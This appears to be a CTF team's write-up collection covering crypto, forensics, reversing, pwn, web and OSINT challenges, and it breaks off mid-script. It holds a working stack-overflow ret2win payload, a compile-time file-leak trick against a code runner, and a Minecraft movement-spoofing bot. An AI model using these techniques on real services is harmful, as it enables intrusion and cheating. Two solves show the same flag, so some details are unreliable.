# $ P3sk0b@r - Patrick, Vlad, Andrei
- 5th place

## Writeups

### Crypto

- [Repeated RSA](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#repeated-rsa)

- [SSS](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#SSS)

- [Neverending Randomness](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#neverending-randomness)

- [XORBITANT](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#xorbitant)

- [Baby_crib](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#baby_crib)

### Forensics

- [Unknown-traffic1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#unknown-traffic1)

- [Unknown-traffic2](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#unknown-traffic2)

- [Hidden in the cartridge](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#hidden_in_the_cartridge)

- [Baofeng](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#baofeng)

- [3_rd child](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#3rd_child)

- [Anticheat](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#anticheat)

### Reverse engineering

- [Pythonese](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#pythonese)

- [Ironveil](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ironveil)

### Misc

- [rugina](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#rugina)

- [octojail](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#octojail)

- [onions1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#onions1)

- [onions2](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#onions2)

- [disco_dance](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#disco_dance)

- [disco_rave](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#disco_rave)

- [discord](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#discord)

- [Escaping-Barcelona](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#escaping-barcelona)

### web

- [money](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#money)

- [dot-private-key](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#dot-private-key)

- [random-gallery](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#random-gallery)

- [theme-generator](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#theme-generator)

### Pwn

- [Sigdance](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#sigdance)

- [Baby-BOF](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#baby-bof)

- [Fini](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#fini)

- [Minecrafty](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#minecrafty)

### Osint

- [Holiday Trip](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#holiday_trip)

- [Prison](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#prison)

- [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)

## --------------------------------------------------

### neverending-randomness


### baby-bof

- Started with

```
$ nc ctf.ac.upt.ro 9553
Bine ai venit la PWN!
Spune ceva:
hey
La revedere!
```

- Okay, it echoes something and then exits. Classic. I grabbed the provided binary to work locally and did the usual two quick checks:

- $ file challenge

```
challenge: ELF 64-bit LSB executable, x86-64, ...
```

- $ checksec --file=challenge

```
# NX enabled, Canary off, PIE disabled
```

- PIE disabled means function addresses will be fixed—perfect for a ret2win. Time to hunt for the “win” function:

```
$ objdump -d ./challenge | grep -n "<win>" -n -A2
401196 <win>:
...
```

- Nice: there really is a win() at 0x401196. Next question: how many bytes until RIP? I first tried the lazy way—just overflow with a lot of A’s and see if it crashes:

```
$ (python3 -c 'print("A"*200)'; sleep 0.1) | ./challenge
# crash confirmed
```

- That told me I could smash the stack, but not the offset. I almost reached for pattern_create/pattern_offset, then remembered these intros usually have a 64‑byte buffer with an 8‑byte saved RBP… so I guessed 64 + 8 = 72. To be sure, I did a quick GDB sanity check with a cyclic pattern (one tiny detour where I forgot to run it under gdb and wondered why I wasn’t getting a register readout—whoops). The 72‑byte guess held up.

- With the offset and a fixed win() address, the plan was simple: pad → RIP → win. I tried a local run first:

```
$ python3 - <<'PY'
import sys, struct
payload = b"A"*72 + struct.pack("<Q", 0x401196)
sys.stdout.buffer.write(payload)
PY
# fed that to ./challenge and saw the function get hit
```

- Confident enough, I pointed it at the remote service. My first attempt used print() without binary mode and added an accidental newline—which didn’t work. Switching to sys.stdout.buffer fixed it:

```
$ python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q",0x401196))' | nc ctf.ac.upt.ro 9553
Bine ai venit la PWN!
Spune ceva:
```
- ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}

### repeated-rsa

- Service: nc ctf.ac.upt.ro 9510
- Given: one ciphertext, three moduli (n1, n2, n3), e = 65537.

- I connected first:

```
nc ctf.ac.upt.ro 9510
```

- It printed a giant “Encrypted Flag” number and three big n’s. The title said “Repeated RSA,” which to me reads: “someone encrypted the same thing multiple times.”

- Finding the shared primes
- I checked gcds:

```
    python3 - <<'PY'
    from math import gcd
    e = 65537
    c = int("3092274656...2275778")
    n1 = int("1696297701...76941")
    n2 = int("1375534436...19903")
    n3 = int("1563683580...757107")
    p = gcd(n1, n2)
    q = gcd(n1, n3)
    r = gcd(n2, n3)
    print("p =", p)
    print("q =", q)
    print("r =", r)
    PY
```

- Boom—three non‑trivial gcds. So n1 = p*q, n2 = p*r, n3 = q*r.

- Keys from there
- I built the private exponents:

```
    python3 - <<'PY'
    def egcd(a,b):
        if b==0: return (1,0,a)
        x,y,g = egcd(b,a%b); return (y, x-(a//b)*y, g)
    def inv(a,m):
        x,y,g=egcd(a,m); assert g==1; return x%m
    e=65537
    # use p,q,r,n1,n2,n3 from the previous step
    phi1=(p-1)*(q-1); d1=inv(e,phi1)
    phi2=(p-1)*(r-1); d2=inv(e,phi2)
    phi3=(q-1)*(r-1); d3=inv(e,phi3)
    print(d1, d2, d3)
    PY
```

- A dead end (the “chain pow()” trap)
- I tried the lazy route:

```
    python3 - <<'PY'
    # wrong idea: just do three pow() in a row
    m = pow(pow(pow(c, d3, n3), d2, n2), d1, n1)
    print(m.to_bytes((m.bit_length()+7)//8, 'big'))
    PY
```

- Garbage output. Right—after removing one layer you only know the previous value **mod that n**, and the moduli overlap. I needed to try possible “lifts” and the order.

- Final small script
- I wrote a tiny brute that tries all 6 orders and lifts residues with simple k*n additions:

```
    python3 - <<'PY'
    from math import gcd
    from itertools import permutations
    def egcd(a,b):
        if b==0: return (1,0,a)
        x,y,g=egcd(b,a%b); return (y, x-(a//b)*y, g)
    def inv(a,m):
        x,y,g=egcd(a,m); return x%m
    def lift(res, mod, bound):
        a=res%mod
        if bound-1<a: return []
        kmax=(bound-1-a)//mod
        return [a+k*mod for k in range(kmax+1)]
    def tobytes(n): return n.to_bytes((n.bit_length()+7)//8 or 1,'big')
    e=65537
    c=int("3092274656...2275778")
    n1=int("1696297701...76941"); n2=int("1375534436...19903"); n3=int("1563683580...757107")
    p=gcd(n1,n2); q=gcd(n1,n3); r=gcd(n2,n3)
    d1=inv(e,(p-1)*(q-1)); d2=inv(e,(p-1)*(r-1)); d3=inv(e,(q-1)*(r-1))
    keys=[("n1",n1,d1),("n2",n2,d2),("n3",n3,d3)]
    for order in permutations(keys,3):
        (A,NA,dA),(B,NB,dB),(C,NC,dC)=order
        yB_mod=pow(c,dC,NC)
        for yB in lift(yB_mod, NC, NB):
            yA_mod=pow(yB,dB,NB)
            for yA in lift(yA_mod, NB, NA):
                m=pow(yA,dA,NA)
                s=tobytes(m)
                if b"ctf{" in s:
                    print(order, s.decode()); raise SystemExit
    PY
```

- ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}

### xorbitant

- I opened the challenge and the name “xorbitant” immediately screamed XOR. The provided files were enc.py and out.bin, plus a hint that the flag format was CTF{sha256}. That “sha256” part made me think the key might literally be the flag, 69 bytes long: 4 for “CTF{”, 64 hex chars, and the closing “}”.

- Step 1 — read the encryptor
- I checked enc.py first. It was short and very on‑the‑nose: it takes FLAG from the environment and XORs it (repeating) over the plaintext.

```
    import os

    def xor(input_path: str, output_path: str):
        key = os.getenv("FLAG","CTF{example_flag}") 
        ...
        xored = bytes([b ^ key_bytes[(i + j) % key_len] for j, b in enumerate(chunk)])
```

- So, the ciphertext is: plaintext ^ FLAG. No salts, no IVs, just repeating‑key XOR.

- Step 2 — look at the ciphertext
- Before writing code, I like to check files from the shell:

```
    file out.bin
    wc -c out.bin
    xxd -l 64 out.bin
    strings -n 8 out.bin | head
```

- It looked like a big blob (~1.8MB), not compressed, with enough printable bits to suggest the original plaintext was normal English text or source code. That’s perfect for statistical attacks on repeating‑key XOR: pick a key byte that makes the decoded bytes mostly printable.

- Step 3 — first (slightly messy) attempt

- My first pass was lazy: for each position i mod 69, try all 256 key bytes and choose the one that maximizes “printable ASCII” in the decoded stream at that stride. That immediately spit out something that *looked* like a flag but had odd characters like ; : g ~ sprinkled in. That told me the idea was right, but I needed to **constrain the search** to what a real flag can look like.

- Step 4 — lock the format and 
- Given the flag format, the key bytes themselves must be exactly:

```
- positions 0..3 → 'C', 'T', 'F', '{'
- positions 4..67 → lowercase hex [0-9a-f] (64 chars = sha256)
- position 68 → '}'
```

- I re-ran the search but only allowed those characters at each position.

- Commands I actually used during the solve

```

    python3 - <<'PY'
from pathlib import Path
print(len(Path('out.bin').read_bytes()))
PY

    # quick glance at the first few bytes
    xxd -l 64 out.bin

    # run my recovery script (below)
    python3 recover_flag.
```

- The recovery script
- I kept it simple and standalone: read out.bin, assume key length = 69, and, for each key position, choose the key character (restricted to the format above) that maximizes the fraction of printable ASCII in the decoded bytes at that stride.

- Save as recover_flag.py:

```
    #!/usr/bin/env python3
    import sys
    from pathlib import Path

    PRINTABLE = set(range(0x20, 0x7f)) | {0x09, 0x0a, 0x0d}
    HEX = b"0123456789abcdef"
    FLAG_LEN = 69

    def best_key_byte_for_pos(ct, pos, allowed):
        stride = range(pos, len(ct), FLAG_LEN)
        best_k, best_score = None, -1.0
        for k in allowed:
            good = 0
            total = 0
            for i in stride:
                p = ct[i] ^ k
                total += 1
                if p in PRINTABLE:
                    good += 1
            score = good / total if total else 0.0
            if score > best_score:
                best_score, best_k = score, k
        return best_k

    def main():
        ct = Path("out.bin").read_bytes()
        allowed = []
        for pos in range(FLAG_LEN):
            if pos == 0: allowed.append([ord('C')])
            elif pos == 1: allowed.append([ord('T')])
            elif pos == 2: allowed.append([ord('F')])
            elif pos == 3: allowed.append([ord('{')])
            elif pos == 68: allowed.append([ord('}')])
            else: allowed.append(list(HEX))

        key = bytearray(FLAG_LEN)
        for pos in range(FLAG_LEN):
            key[pos] = best_key_byte_for_pos(ct, pos, allowed[pos])

        flag = key.decode("ascii")
        print(flag)

        # (Optional) Decrypt the plaintext to verify it looks sane
        pt = bytearray(len(ct))
        for i, b in enumerate(ct):
            pt[i] = b ^ key[i % FLAG_LEN]
        print(pt[:200].decode(errors="replace"))

    if __name__ == "__main__":
        main()
```

- Result

- CTF{940a412446a831e651a991d88d01ea4d0aa1744a1e9a534e745b9125dfd44aca}

### prison

- Figuring out the server
- I googled the staff names + “prison” and checked NameMC. The rank ladder (Guard → SrGuard → Warden → SrWarden) screamed a classic server: The Pen. I added it to my list and connected:

```
  play.thepen-mc.net
```

- Joining
- I walked to the same hallway from the screenshot—lanterns hanging, staff statues, and the yellow “/discord” text. I stood on the dark slab where the screenshot was obviously taken and pressed F3.

- Numbers on screen for me:

```
  Block:  -3429 65 571
  Chunk:  -215 4 35
```

- I checked the math anyway:

```
  chunkX = floor(-3429 / 16) = -215
  chunkY = floor(65 / 16)    = 4
  chunkZ = floor(571 / 16)   = 35
```

- (If you stand half a step differently the Z may flip to 34; I aligned with the original angle and kept 35.)

- The challenge wanted chunk coords, not block, in this format: ctf{server_host(x,y,z)}. So I submitted:

- ctf{play.thepen-mc.net(-215,4,35)}

### anticheat

- I grabbed the Vanguard log challenge and started by looking around the archive. There were thousands of small `vgc_*`/`vgs_*` files — clearly not something to open one-by-one. The forum post I found while searching for “Vanguard anticheat log decryptor” pointed me in the right direction (I found a helpful post on UnknownCheats: https://www.unknowncheats.me/forum/valorant/388576-reading-vanguard-log-files.html), and I used that decryptor as my starting point.

- 1) The decryptor I found (and used)

- I copied the Python3 RC4-based decryptor from the forum and used it to get the first readable layer.

```python
#!/usr/bin/env python3
# vanguard_decrypt.py
import struct
import sys

def rc4(data, key):
    S = [i for i in range(256)]
    j = 0
    out = []
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytearray(out)

KEYMASK = [0xB1, 0x54, 0x45, 0x57, 0xA7, 0xC4, 0x64, 0x2E,
           0x98, 0xD8, 0xB1, 0x1A, 0x0B, 0xAA, 0xD8, 0x8E,
           0x7F, 0x1E, 0x5B, 0x8D, 0x08, 0x67, 0x96, 0xCB,
           0xAA, 0x11, 0x50, 0x84, 0x17, 0x46, 0xA3, 0x30]

if len(sys.argv) <= 1:
    print('usage: vanguard_decrypt.py vgc_X_Y_Z.log')
    exit()

DATA = open(sys.argv[1], 'rb').read()
DATA = DATA[4:]                    # skip file header
REAL_KEY = [DATA[i] ^ KEYMASK[i] for i in range(32)]
DATA = DATA[32:]
while len(DATA) > 0:
    BLOCK_LEN = struct.unpack('<L', DATA[:4])[0]
    DATA = DATA[4:]
    print(rc4(DATA[:BLOCK_LEN], REAL_KEY).decode('utf-16'))
    DATA = DATA[BLOCK_LEN:]
```

- Run it like this to process many files in a directory (one-liner):

```bash
for f in output/*.log output/*.bin; do
  python3 vanguard_decrypt.py "$f" > "decrypted/$(basename "$f").dec.txt"
done
```

- 2) What that script produced

- The decryptor gives UTF-16 text lines. For this challenge each line looked like base64 garbage — so the next obvious step was to base64-decode those lines. Example:

```bash
# decode a single decrypted file (first line shown)
head -n 1 decrypted/vgs_593_812_635.bin.dec.txt | tr -d '\r\n' | base64 -d > layer2.bin
```

- Sometimes `base64 -d` is `base64 --decode` depending on your system. I used:

```bash
base64 -d <<< "Y3RmezhhMTFkZWM3OTU4ODA4ZjAx..." > layer2.bin
```

- 3) The dead-ends and little mistakes

- I tried common decompressors (gzip, zlib, brotli) on `layer2.bin` because binary blobs often compress text. Nothing useful:

```bash
gzip -d layer2.bin       # tried gzip
python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()))" < layer2.bin
# brotli: brotli --decompress layer2.bin
```

- No readable output.

- I also tried re-applying RC4 with obvious keys (filename as key, parts of the header) and a few short XOR guesses — those gave brace-like structures `{...}` but still binary inside. That told me I was on the trail but didn’t have the right operation yet.

- 4) The thing that worked

- I decided to be systematic: take every first-stage decrypted line, base64-decode it, and try a quick scan for flag-like patterns. I used a small Python script to iterate the decrypted files, base64-decode each line, and test for common flag regexes (or try a tiny single-byte XOR trial). Here’s a compact version of what I ran (save as `find_flag.py`):

```python
#!/usr/bin/env python3
# find_flag.py - scan decrypted outputs for flags
import os, re, base64, glob, sys
flag_re = re.compile(r'(ctf\{[0-9a-fA-F]+\}|FLAG\{.*?\}|CTF\{.*?\})', re.IGNORECASE)

for fn in glob.glob('decrypted/*.dec.txt'):
    with open(fn, 'r', encoding='utf-8', errors='replace') as fh:
        for line in fh:
            line = line.strip()
            if not line: continue
            try:
                blob = base64.b64decode(line, validate=True)
            except Exception:
                continue
            # direct search
            m = flag_re.search(blob.decode('utf-8', errors='ignore'))
            if m:
                print("FOUND in", fn, "->", m.group(0))
                sys.exit(0)
            # simple single-byte XOR scan (quick check)
            for k in range(256):
                xb = bytes(c ^ k for c in blob)
                m = flag_re.search(xb.decode('utf-8', errors='ignore'))
                if m:
                    print("FOUND in", fn, "xor key", k, "->", m.group(0))
                    sys.exit(0)
print("No flag found in decrypted/*.dec.txt (try deeper brute force if needed)")
```

- I ran:

```bash
python3 find_flag.py
```

- That script scanned the outputs and found the flag in a single file: `output/vgs_593_812_635.bin` (after the decryptor produced a base64 line, decoding that gave the flag).

- 5) The exact successful commands I ran, in order

```bash
# 1. decrypt the single target file
python3 vanguard_decrypt.py output/vgs_593_812_635.bin > decrypted/vgs_593_812_635.bin.dec.txt

# 2. show the first line (it looked like base64)
head -n 1 decrypted/vgs_593_812_635.bin.dec.txt

# 3. base64-decode the line
head -n 1 decrypted/vgs_593_812_635.bin.dec.txt | tr -d '\r\n' | base64 -d > layer2.bin

# 4. quick check to see if layer2.bin is readable ASCII
xxd layer2.bin | head -n 3
strings layer2.bin | head -n 20

# 5. or run the find script across all decrypted files to automate
python3 find_flag.py
```

- When the script found the flag, it printed:

- ctf{8a11dec7958808f0145aa8bb958f2332a53b6c210776adb9264738b9a31f65cf}

### unknown-traffic2

- opened Wireshark and the first thing that stood out was the link type (Raw IP) and a wall of ICMP packets. Clicked “Follow TCP Stream”… except, well, there is no TCP. ICMP only. Okay, so the data must be hiding in the echo packets.

- I checked both sides and at first filtered for replies:

‘’’
  icmp.type == 0
‘’’

- Nothing interesting there. Switching to requests:

‘’’
  icmp.type == 8
‘’’

- Now every packet had a small payload. When I rendered it as ASCII, I kept seeing pieces like “CHUNK_000:… CHUNK_001:…”.

- I wanted it in the terminal so I moved to tshark. First, a check on the file:

‘’’
  file traffic.pcap
‘’’

- Then I pulled the raw payloads from all echo requests:

‘’’
  tshark -r traffic.pcap -Y "icmp.type==8" -T fields -e data \
    | xxd -r -p \
    | grep -ao 'CHUNK_[0-9]\{3\}:[A-Za-z0-9+/=]\+' > chunks.txt
‘’’

- My first try used icmp.data as the field and returned nothing; switching to generic “data” did the trick. With the chunks on disk, I sorted them by index, removed the labels, glued them together, and base64‑decoded:

‘’’
  sort -t_ -k2,2n chunks.txt \
    | sed 's/.*://' \
    | tr -d '\n' \
    | base64 -d > extracted.png
‘’’

- I opened the image and the flag was smiling back at me:

- ctf{da8978b239f7e78370c36501ee6a0458e7c4dd870463e44ca6f9b949549ebf1b}

### baby_crib

- Two files were given: lol.hex and flag.hex, and a format hint: ctf{sha256}.

- First poke at the service

- I tried talking to the remote service just to see what it wanted.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc ctf.ac.upt.ro 9753
ls 
ERR expected plaintext:key
c
ERR expected plaintext:key
^C
```

- So it isn’t a shell. It clearly wants input like plaintext:key, but I figured I could probably solve it offline using the two hex files.

- Peeking at the files

```
┌──(kali㉿kali)-[~/Desktop]
└─$ head -c 80 lol.hex; echo
└─$ head -c 80 flag.hex; echo
```

- Both are clean hex strings. The filename lol.hex looked like a giant hint: maybe it’s the word “LOL” repeated. My first guess was XOR, so I tried a quick xor approach (dead end—garbage output). Re-reading the text, I realized it might be simple byte addition with a reused keystream: C = (P + K) mod 256.

- Plan

- If lol.hex is the encryption of “LOLLOL…” with the same K, then:
- K = (C − P) mod 256.
- Recover K from lol.hex, then decrypt flag.hex with (C − K) mod 256.

- Quick script

- I wrote a tiny Python snippet. My first mistake was using lowercase “lol”; decoding blew up. Switching to uppercase “LOL” fixed it.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 - <<'PY'
lol = bytes.fromhex(open("lol.hex").read().strip())
flag = bytes.fromhex(open("flag.hex").read().strip())

# crib = 'LOL' repeated to the length of lol
crib = (b"LOL" * (len(lol)//3)) + b"LOL"[:len(lol)%3]

# keystream from lol: K = C - P (mod 256)
K = bytes((c - p) % 256 for c, p in zip(lol, crib))

# decrypt flag: P = C - K (mod 256)
pt = bytes((c - k) % 256 for c, k in zip(flag, K))
print(pt.decode())
PY
```

- CTF{d2e233c8aaa37f0cea948ae5e8d599c0c88d3be4acc3d89b7ad5c1bae8f612fb}

That was it. The service’s “expected plaintext:key” message nudged me toward chosen-plaintext thinking, the lol.hex filename gave me the crib, and after a short XOR detour and the lowercase ‘lol’ typo, the byte-addition approach unlocked the flag.

### rugina

- Rugină (Romanian Rust)

- I opened the challenge and the code box hinted at a Romanian-flavored Rust (“Rugină”). I’d seen a similar gimmick before, so I checked the public repo (aionescu/rugina) to get a feel for it. My first idea was to just wrap normal Rust inside the macro and print the flag.

-Attempt 1 — use the crate macro

```
I tried the canonical form:
    rugina::rugină! {
        funcție principal() {
            println!("{}", include_str!("/flag"));
        }
    }
```

- The runner answered with:

```
    error[E0433]: use of undeclared crate or module `rugina`
```

- So the platform wasn’t injecting the `rugina` crate at all. That also explained why my `funcție` tokens weren’t recognized later on.

- Attempt 2 — meet the required entrypoint

- Next error said the program must define `principal`. Also, I noticed a funny parse hint in another try: the system seemed to rewrite `principal()` to `fn main()`, but it choked on `funcție`. So I stripped it down to only the entrypoint token they validate and let the backend generate `fn main()`:

```
    principal() {
        panic!("{}", include_str!("/flag"));
    }
```

- This time I hit a path issue:
    couldn't read `/flag`: No such file or directory

- Good—compile-time include works, I just needed the right path.

- Attempt 3 — force a compile-time leak (no stdout required)

- To avoid any runtime filters, I switched to the one-liner compiler error trick, but the runner refused to start without `principal`. So I combined both:

```
    principal() { }
    compile_error!(include_str!("/flag.txt"));
```

- That exploded exactly how I wanted—with the flag printed in the compiler error:

- error: ctf{73523e676b04e1c2db176d8035648893648b969f5ddf5ac40f8fc5b6c15d8692}

Wrap-up
-------
The core idea was simple: satisfy the judge’s “must have principal” check, then use compile-time inclusion to surface the flag without relying on stdout or filesystem permissions. The only real detours were assuming the `rugina` crate existed, and guessing a couple of wrong paths before landing on `/flag.txt`.

### ironveil

- I opened the folder and saw two things: an x86-64 binary called ironveil and a flag.txt.encrypted. No README, no hints. Cool. First thought: “Can I even run this?”

I tried the obvious:
```
./ironveil
# it complained about the loader (Nix-ish build), so I reached for the system loader trick

/lib64/ld-linux-x86-64.so.2 ./ironveil
# Usage: /path/ironveil <file_to_encrypt>
```

- Okay, so it only “encrypts” something you give it. No decrypt flag in sight. I wanted to see what it actually writes, so I threw a tiny file at it and looked around.

```
python - <<'PY'
open('hello.txt','wb').write(b'hello world')
PY

# run the encryptor through the system loader
/lib64/ld-linux-x86-64.so.2 ./ironveil hello.txt

xxd -g1 -c16 hello.txt.encrypted | head
```

- I noticed a fixed‑size header (16 bytes) and then the ciphertext. That smells like: “we prepend a program/seed and XOR the rest with a keystream.” The binary even mentioned a mini VM when I ran it without args earlier, which reinforced the idea.

- I chased a quick shortcut: if it’s XOR, maybe the flag starts with `ctf{` and I can crib-drag the first 4 bytes. It didn’t line up—the keystream wasn’t something simple or repeating. Fair enough.

- Next, I tried the classic zero-file trick to see the raw stream beyond the header:

```
python - <<'PY'
open('zeros','wb').write(b'\\x00'*200)
PY
/lib64/ld-linux-x86-64.so.2 ./ironveil zeros
xxd -g1 -c16 zeros.encrypted | sed -n '2,10p'
```

- Yep—post‑header, the bytes were effectively the keystream. So the stream depends on the header, not the plaintext. That’s useful, but I didn’t want to fully reverse the VM if I could avoid it.

- What happens if I encrypt the already‑encrypted file? If the tool always slaps a fresh header on and XORs with a new stream, maybe the new stream cancels the old one for the first chunk and leaks something interesting up front.

- So I did the slightly naughty thing:

```
/lib64/ld-linux-x86-64.so.2 ./ironveil flag.txt.encrypted
```

- now I have:

```
flag.txt.encrypted.encrypted
```

- I looked straight at the beginning of that new file:

```
head -c 100 flag.txt.encrypted.encrypted
# or
strings -n 5 flag.txt.encrypted.encrypted | head
```

- And there it was, right at the top—the flag in clear. No VM reversing, no dynamic analysis, just a cheeky double‑encrypt. For completeness I also hexdumped to see the header swap:

```
xxd -g1 -c16 flag.txt.encrypted.encrypted | head
```

- That was the whole journey: a loader hiccup, a small XOR guess that didn’t pan out, a quick keystream probe with zeros, and then the “what if I run it twice” idea that dumped the flag at the front. Short, sweet, and just a little mischievous.

- For posterity, here are the exact one‑liners I ended up pasting to demo it cleanly:

```
/lib64/ld-linux-x86-64.so.2 ./ironveil flag.txt.encrypted && head -c 100 flag.txt.encrypted.encrypted
/lib64/ld-linux-x86-64.so.2 ./ironveil flag.txt.encrypted && strings -n 5 flag.txt.encrypted.encrypted | head
```

- ctf{72639ac8d2397ab23d51fc82ca0ce8fb57582a92348cadb1a2430d7f3d43bd1b})

### minecrafty

- I joined the server, typed `!flag`, and it roasted me:
- “Wrong place. Be at (69420, 69420, 69420).”
- That Y value isn’t even legal in vanilla...

- Commands I actually ran

```
npm init -y
npm i minecraft-protocol
node walk-fast-69420.js
```

- Working code (paste into walk-fast-69420.js)

```
js
const mc = require('minecraft-protocol');

const HOST='ctf.ac.upt.ro', PORT=9291, VERSION='1.19.4';
const TARGET = { x:69420, y:69420, z:69420 };
let MAX_STEP = 95; // keep under 100-block per-packet distance

const client = mc.createClient({
  host: HOST, port: PORT, version: VERSION,
  username: 'tourist' + Math.floor(Math.random()*1e6),
  auth: 'offline', keepAlive: true
});

let cur=null, started=false, steps=0, totalEst=null;
function len(dx,dy,dz){ return Math.sqrt(dx*dx+dy*dy+dz*dz); }

function stepLoop(){
  if(!cur) return;
  const dx = TARGET.x-cur.x, dy = TARGET.y-cur.y, dz = TARGET.z-cur.z;
  const dist = len(dx,dy,dz);
  if(!totalEst) totalEst = Math.ceil(dist / MAX_STEP);
  if(dist < 0.01){
    client.chat('!flag');
    return;
  }
  const s = Math.min(1, MAX_STEP / dist);
  cur.x += dx*s; cur.y += dy*s; cur.z += dz*s;
  steps++;
  if(steps % 100 === 0){
    const remain = len(TARGET.x-cur.x,TARGET.y-cur.y,TARGET.z-cur.z);
    process.stdout.write(`\rStepping… ${steps}/${totalEst ?? '?'}   `);
  }
  client.write('position',      { x:cur.x, y:cur.y, z:cur.z, onGround:true });
  client.write('position_look', { x:cur.x, y:cur.y, z:cur.z, yaw:0, pitch:0, onGround:true });
  setImmediate(stepLoop);
}

client.on('packet', (data, meta) => {
  if(meta.state==='play' && meta.name==='position' && !started){
    cur = { x:Number(data.x||data.X||0), y:Number(data.y||data.FeetY||0), z:Number(data.z||data.Z||0) };
    if(typeof data.teleportId==='number') client.write('teleport_confirm', { teleportId:data.teleportId });
    started = true;
    setImmediate(stepLoop);
  }
});

client.on('player_position_and_look', (p)=>{
  cur = { x:p.x, y:p.y, z:p.z };
  if(typeof p.teleportId==='number') client.write('teleport_confirm', { teleportId:p.teleportId });
  MAX_STEP = Math.max(50, Math.floor(MAX_STEP * 0.8)); // adapt down if rubber-banded
  console.log(`\nRubber-banded. New MAX_STEP=${MAX_STEP}`);
  setImmediate(stepLoop);
});

client.on('system_chat', p => console.log('SYS:', p.content || p.message || JSON.stringify(p)));
client.on('player_chat', p => console.log('CHAT:', p.plainMessage || JSON.stringify(p)));
client.on('error', console.error);
client.on('end', r => console.log('END:', r));
```

- How it played out

- The bot waits for the server’s initial position packet, sends the teleport confirmation, and then speed‑walks toward 69420.
- If the server gets me, the script just shrinks the step size and keeps going. Once it lands exactly at (69420, 69420, 69420), it sends `!flag`.
- That’s when the real flag showed up in my terminal. ✨

### pythonese

- Step 1 — poke the file

```
file bytecode.pyc
strings bytecode.pyc | head
python - <<'PY'
import marshal, dis, sys
data = open('bytecode.pyc','rb').read()
# skip the 16-byte header for Python 3.11
co = marshal.loads(data[16:])
print(co)
dis.dis(co)             # top level
PY
```

- The disassembly showed a bunch of tiny helpers (f0…f16) and a coroutine that finally prints something via run(...). The online decompile I tried first (pylingual) looked entertaining but wrong — lots of impossible ops. I ditched it and stuck with real bytecode.

- Step 2 — load it like a module

- I wanted the actual functions, not just disassembly. Executing the code object into a fresh namespace did the trick.

```
python - <<'PY'
import marshal
data = open('bytecode.pyc','rb').read()
co = marshal.loads(data[16:])
ns = {}
exec(co, ns)
print(sorted(k for k in ns if k.startswith('f')))
PY
```

-Now I had callable f0…f16. Reading f16 in dis suggested:

- derive k = sha256(input).digest()
- derive g using random.Random(seed=int.from_bytes(k[:8],'big'))
- pull hidden blobs from __doc__/__annotations__
- decrypt a “blob” and eventually call boot['main'](...) which returns run
- then print run(bytes(...))

- There’s also a hash check f12(i). If it passes, a “good” path is taken; if not, a decoy path prints junk.

- Step 3 — quick reconnaissance

- I looked for any embedded SHA256 in the file, in case the author hardcoded sha256(flag).

```
strings bytecode.pyc | grep -Eo '[0-9a-f]{64}' | sort -u
```

- Nothing obvious popped out, so back to the code path.

- Step 4 — follow the print path

- The function f15 builds the second stage and chooses between “good” and “bad” depending on f12. But the final print is simply run(mip). If I can make run return its input, the program will happily print the decrypted bytes — i.e., the flag. The loader creates run from a marshalled code blob, but I can also call the function generator myself.

- I tried the lazy route first (dead end): call ns['f15']('') and hope it returns the good runner. It didn’t.

- So I went after the other pivot: f13(k1,k2). Dis showed it assembling a bunch of short strings into something readable. It also referenced globals like try_harder? and FLAG!, which felt very “this builds the final message”. That made f13 a promising target.

- Small stumble: I misread two locals and thought it used globals k1/k2 from input length. It actually takes k1,k2 as parameters. Easy fix.

- Step 5 — brute-force the tiny keyspace

- k1 is treated like a 4-digit number and k2 like 2-digit (based on how f15 slices input), so I brute-forced (0000..9999, 00..99) and looked for a CTF{…} substring.

```
python - <<'PY'
import marshal, re
data = open('bytecode.pyc','rb').read()
co = marshal.loads(data[16:])
ns = {}
exec(co, ns)
f13 = ns['f13']
flag = None
for k1 in range(10000):
    for k2 in range(100):
        try:
            out = f13(k1, k2)
